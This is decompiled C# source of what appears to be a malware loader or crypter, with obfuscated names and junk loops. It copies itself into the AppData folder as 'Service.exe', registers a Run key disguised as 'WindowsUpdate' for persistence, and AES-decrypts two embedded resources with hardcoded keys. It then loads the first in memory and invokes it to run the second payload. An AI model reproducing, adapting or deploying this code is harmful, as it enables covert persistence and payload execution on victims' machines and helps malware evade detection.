using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace nkxpxnda9pd78dy2;

internal class Program
{
	public class cXeqTVfjkgBBRClnoEHb
	{
		public void KtgnIJmIttnuDDePJngdsO()
		{
			for (int num = 629815; num == 629815; num = 368449)
			{
			}
			Math.Ceiling(Math.Acos(0.0));
			for (int i = 190592985; i == 190592985; i += 317772)
			{
			}
			for (int j = 53981246; j == 53981246; j += 96546)
			{
			}
			Math.Log(1000.0, 10.0);
			int? num2 = new int?(1923781) + 3187;
			for (int num3 = 896431888; num3 == 896431888; num3 = 565467)
			{
			}
		}
	}

	public class HhAm
	{
		public void qKegCRZeF()
		{
			Math.Pow(5.0, 2.0);
			Console.ReadLine();
		}
	}

	public static byte[] pujg4vq5019v99h2(string filename)
	{
		ResourceManager resourceManager = new ResourceManager("8fba1bbe3d6443e7a60661850d0a7fe7", Assembly.GetExecutingAssembly());
		return (byte[])resourceManager.GetObject(filename);
	}

	[STAThread]
	private static void Main(string[] args)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		new OpenFileDialog();
		for (int i = 0; i < 5; i++)
		{
			if (hhoyzd8uyr88emdy())
			{
				break;
			}
		}
	}

	private static bool hhoyzd8uyr88emdy()
	{
		try
		{
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Service.exe");
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("WindowsUpdate", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Service.exe");
			byte[] pay = pujg4vq5019v99h2("19e90b1c6fb64f319c7b5b232b246100");
			byte[] pay2 = pujg4vq5019v99h2("32f87785acd6441b9f1b62fd4459905f");
			pay = mg3inu9uffw2qx86(pay, "爾z55KKr誨Q7g爾ekgJ意c5雎B0意覽RqipSlI9覽mhd饒雎罷E雎eHj6lAm", "爾z55KKr誨Q7g爾ekgJ意c5雎B0意覽RqipSlI9");
			pay2 = mg3inu9uffw2qx86(pay2, "爾z55KKr誨Q7g爾ekgJ意c5雎B0意覽RqipSlI9覽mhd饒雎罷E雎eHj6lAm", "爾z55KKr誨Q7g爾ekgJ意c5雎B0意覽RqipSlI9");
			Assembly assembly = Assembly.Load(pay);
			Type type = assembly.GetType("Resource.reflect");
			MethodInfo method = type.GetMethod("Apply");
			method.Invoke(null, new object[4]
			{
				Assembly.GetExecutingAssembly().Location,
				"",
				pay2,
				false
			});
			return true;
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			return false;
		}
	}

	private static byte[] mg3inu9uffw2qx86(byte[] Pay, string _key, string _salt)
	{
		try
		{
			PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(_key, Encoding.UTF8.GetBytes(_salt));
			MemoryStream memoryStream = new MemoryStream();
			Aes aes = new AesManaged();
			aes.Key = passwordDeriveBytes.GetBytes(aes.KeySize / 8);
			aes.IV = passwordDeriveBytes.GetBytes(aes.BlockSize / 8);
			CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(Pay, 0, Pay.Length);
			cryptoStream.Close();
			return memoryStream.ToArray();
		}
		catch
		{
			Environment.Exit(0);
			return new byte[0];
		}
	}
}
